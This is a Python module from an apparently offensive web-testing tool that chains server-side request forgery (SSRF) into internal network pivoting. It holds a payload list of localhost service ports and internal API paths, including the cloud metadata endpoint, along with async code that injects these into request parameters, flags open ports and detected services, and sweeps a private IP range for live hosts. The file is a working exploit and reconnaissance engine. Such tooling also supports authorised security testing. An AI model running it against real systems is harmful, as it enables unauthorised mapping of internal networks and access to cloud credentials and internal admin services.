"""
M7 SSRF Chain Engine — SSRF to internal network pivoting.
Made by Milkyway Intelligence | Author: Sharlix Martin
"""

import asyncio
import re
from typing import Dict, List, Any, Optional

from m7ssrf.requestor import Requestor
from m7ssrf.analyzer import ResponseAnalyzer
from utils.logger import Logger


# Internal network discovery targets
INTERNAL_DISCOVERY_TARGETS = [
    # Common internal admin panels
    ("http://127.0.0.1:80/", "localhost:80"),
    ("http://127.0.0.1:443/", "localhost:443"),
    ("http://127.0.0.1:8080/", "localhost:8080"),
    ("http://127.0.0.1:8443/", "localhost:8443"),
    ("http://127.0.0.1:8888/", "localhost:8888"),
    ("http://127.0.0.1:9090/", "localhost:9090"),
    ("http://127.0.0.1:3000/", "localhost:3000 (Grafana/Node)"),
    ("http://127.0.0.1:4200/", "localhost:4200 (Angular dev)"),
    ("http://127.0.0.1:5000/", "localhost:5000 (Flask)"),
    ("http://127.0.0.1:5601/", "localhost:5601 (Kibana)"),
    # Database ports
    ("http://127.0.0.1:3306/", "MySQL"),
    ("http://127.0.0.1:5432/", "PostgreSQL"),
    ("http://127.0.0.1:6379/", "Redis"),
    ("http://127.0.0.1:27017/", "MongoDB"),
    ("http://127.0.0.1:9200/", "Elasticsearch"),
    ("http://127.0.0.1:11211/", "Memcached"),
    ("http://127.0.0.1:5672/", "RabbitMQ"),
    # Admin/management
    ("http://127.0.0.1:8500/", "Consul"),
    ("http://127.0.0.1:8761/", "Eureka"),
    ("http://127.0.0.1:4646/", "Nomad"),
    ("http://127.0.0.1:2379/", "etcd"),
    ("http://127.0.0.1:8001/", "Kubernetes API"),
    ("http://127.0.0.1:10250/", "Kubelet API"),
    # SSH
    ("http://127.0.0.1:22/", "SSH"),
    # SMTP
    ("http://127.0.0.1:25/", "SMTP"),
    ("http://127.0.0.1:587/", "SMTP Submission"),
]

# Well-known internal API paths
INTERNAL_API_PATHS = [
    "/",
    "/api/",
    "/api/v1/",
    "/admin/",
    "/admin/login",
    "/manager/",
    "/health",
    "/metrics",
    "/status",
    "/info",
    "/_cat/indices",
    "/_cluster/health",
    "/api/v1/namespaces",
    "/v1/sys/health",
    "/v2/keys/",
    "/latest/meta-data/",
]

# Patterns that confirm a port is open (even without full response body)
OPEN_PORT_SIGNALS = [
    re.compile(r"HTTP/\d", re.IGNORECASE),
    re.compile(r"Content-Type:"),
    re.compile(r"Server:"),
    re.compile(r"<!DOCTYPE", re.IGNORECASE),
    re.compile(r"<html", re.IGNORECASE),
    re.compile(r"\{.*\}", re.DOTALL),  # JSON response
]


class SSRFChain:
    """
    SSRF Chaining Engine.
    
    After initial SSRF confirmation, attempt to:
    1. Map open ports on localhost
    2. Detect internal services
    3. Access cloud metadata
    4. Pivot to internal networks
    """

    def __init__(
        self,
        requestor: Requestor,
        analyzer: ResponseAnalyzer,
        logger: Logger,
    ):
        self.requestor = requestor
        self.analyzer = analyzer
        self.logger = logger

    async def scan(
        self,
        url: str,
        params: Dict[str, str],
    ) -> List[Dict[str, Any]]:
        """Run SSRF chaining scan against all params."""
        results = []

        for param in params:
            chain_results = await self._scan_param(url, param)
            results.extend(chain_results)

        return results

    async def _scan_param(
        self,
        url: str,
        param: str,
    ) -> List[Dict[str, Any]]:
        """Probe internal targets through a single parameter."""
        results = []

        tasks = [
            self._probe_target(url, param, target, label)
            for target, label in INTERNAL_DISCOVERY_TARGETS
        ]

        # Run in batches to avoid overwhelming
        batch_size = 20
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i + batch_size]
            batch_results = await asyncio.gather(*batch, return_exceptions=True)
            for r in batch_results:
                if isinstance(r, dict) and r.get("severity"):
                    results.append(r)

        return results

    async def _probe_target(
        self,
        url: str,
        param: str,
        target: str,
        label: str,
    ) -> Dict[str, Any]:
        """Probe a single internal target through SSRF."""
        try:
            from discovery.url_parser import URLParser
            injected_url = URLParser.replace_param(url, param, target)
            response = await self.requestor.get(injected_url)

            if not response:
                return {}

            status = response.get("status_code", 0)
            body = response.get("body", "")
            elapsed = response.get("elapsed", 0)

            # Analyze for SSRF signals
            analysis = self.analyzer.analyze(response, target, injected_url)
            if analysis.get("detected"):
                return {
                    "url": url,
                    "injected_url": injected_url,
                    "param": param,
                    "payload": target,
                    "type": "ssrf_chain",
                    "severity": analysis["severity"],
                    "signal": f"Chain: {label} — {analysis['signal']}",
                    "evidence": analysis.get("evidence", ""),
                }

            # Check for open port via response characteristics
            if status > 0 and self._indicates_open_port(body, status, elapsed):
                service = self.analyzer.detect_internal_service(response)
                svc_label = f" ({service})" if service else ""

                return {
                    "url": url,
                    "injected_url": injected_url,
                    "param": param,
                    "payload": target,
                    "type": "ssrf_chain_port_open",
                    "severity": "MEDIUM",
                    "signal": f"Internal port open via SSRF chain: {label}{svc_label}",
                    "evidence": f"Status: {status}, Elapsed: {elapsed:.2f}s",
                }

        except Exception as e:
            self.logger.verbose(f"[chain] Error probing {target}: {e}")

        return {}

    def _indicates_open_port(
        self, body: str, status: int, elapsed: float
    ) -> bool:
        """Determine if response suggests an open internal port."""
        # Non-zero status with content suggests port is open
        if status in (200, 301, 302, 400, 401, 403, 404, 500):
            for pattern in OPEN_PORT_SIGNALS:
                if pattern.search(body):
                    return True

        # Fast response to known-bad target suggests filtered vs closed
        # (too noisy; skip timing-only heuristics here)
        return False

    async def discover_network_range(
        self,
        url: str,
        param: str,
        base_ip: str = "192.168.1",
        start: int = 1,
        end: int = 10,
    ) -> List[Dict[str, Any]]:
        """
        Probe a range of internal IPs to discover live hosts.
        E.g. 192.168.1.1 — 192.168.1.10
        """
        results = []
        tasks = []

        for i in range(start, end + 1):
            target = f"http://{base_ip}.{i}/"
            tasks.append(
                self._probe_target(url, param, target, f"Internal host {base_ip}.{i}")
            )

        raw = await asyncio.gather(*tasks, return_exceptions=True)
        for r in raw:
            if isinstance(r, dict) and r.get("severity"):
                results.append(r)

        return results
